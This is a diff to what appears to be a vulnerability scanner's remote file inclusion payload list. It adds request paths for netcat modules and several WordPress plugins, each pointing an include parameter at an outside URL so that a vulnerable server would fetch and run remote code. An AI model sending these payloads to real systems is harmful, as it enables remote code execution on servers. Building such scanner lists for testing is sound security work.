@@ -2855,3 +2855,14 @@ phorum/plugin/replace/plugin.php?PHORUM[settings_dir]=http://www.uniscan.com.br/
 Sources/Packages.php?sourcedir=http://www.uniscan.com.br/c.txt?
 modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path=http://www.uniscan.com.br/c.txt?
 cgi-bin//gadgets/Blog/BlogModel.php?path=http://www.uniscan.com.br/c.txt?
+netcat/modules/filemanager/function.inc.php?MODULE_FOLDER=http://www.uniscan.com.br/c.txt?
+netcat/modules/forum2/function.inc.php?MODULE_FOLDER=http://www.uniscan.com.br/c.txt?
+netcat/modules/logging/function.inc.php?MODULE_FOLDER=http://www.uniscan.com.br/c.txt?
+wp-content/plugins/thecartpress/checkout/CheckoutEditor.php?tcp_save_fields=true&tcp_class_name=asdf&tcp_class_path=http://www.uniscan.com.br/c.txt?
+wp-content/plugins/wpeasystats/export.php?homep=http://www.uniscan.com.br/c.txt?
+wp-content/plugins/annonces/includes/lib/photo/uploadPhoto.php?abspath=http://www.uniscan.com.br/c.txt?
+wp-content/plugins/disclosure-policy-plugin/functions/action.php?delete=asdf&blogUrl=asdf&abspath=http://www.uniscan.com.br/c.txt?
+wp-content/plugins/mailz/lists/config/config.php?wpabspath=http://www.uniscan.com.br/c.txt?
+wp-content/plugins/zingiri-web-shop/fws/ajax/init.inc.php?wpabspath=http://www.uniscan.com.br/c.txt?
+fwkfor/ajax/init.inc.php?wpabspath=http://www.uniscan.com.br/c.txt?
+wp-content/plugins/relocate-upload/relocate-upload.php?ru_folder=asdf&abspath=http://www.uniscan.com.br/c.txt?
